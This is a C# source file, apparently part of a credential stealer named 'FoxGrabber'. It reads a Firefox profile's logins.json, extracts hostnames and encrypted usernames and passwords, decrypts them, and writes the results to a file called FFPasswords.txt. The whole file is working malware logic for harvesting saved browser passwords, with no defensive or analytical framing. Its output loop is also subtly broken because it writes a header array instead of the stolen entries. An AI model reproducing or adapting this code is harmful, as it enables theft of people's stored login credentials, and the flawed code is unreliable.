using System.Collections.Generic;
using System.IO;

namespace FoxGrabber
{
    internal class ParsJson
    {
        private static readonly List<string[]> data = new List<string[]>();

        private static readonly string JsLogins = Path.Combine(MozPath.GetRandomFF(), @"logins.json");

        public static void DeserealizeAndPars()
        {
            string text = File.ReadAllText(JsLogins);
            while (text.IndexOf("\"encryptedPassword\":\"") != -1)
            {
                text = text.Substring(text.IndexOf("\"hostname\":\"") + 12);
                string text2 = text;
                text2 = text2.Remove(text2.IndexOf("\",\"httpRealm\""));
                text = text.Substring(text.IndexOf("\"encryptedUsername\":\"") + 21);
                string text3 = text;
                text3 = text3.Remove(text3.IndexOf("\""));
                text = text.Substring(text.IndexOf("\"encryptedPassword\":\"") + 21);
                string text4 = text;
                text4 = text4.Remove(text4.IndexOf("\""));
                data.Add(new string[]
                {
                    text2, text3, text4
                });
            }
        }

        public static void GetPassword(List<string[]> general)
        {
            DeserealizeAndPars();
            int count = general.Count;
            string[] array = new string[4];
            array[0] = "########################";
            array[1] = MozPath.GetRandomFF();
            array[2] = "########################";
            general.Add(array);

            for (int i = 0; i < data.Count; i++)
            {
                general.Add(new string[]
                {
                    $"{count + i + 1})",data[i][0],  Decoder.Decrypt(data[i][1]), Decoder.Decrypt(data[i][2])
                });
                File.AppendAllText("FFPasswords.txt", array[i]);
            }
        }
    }
}
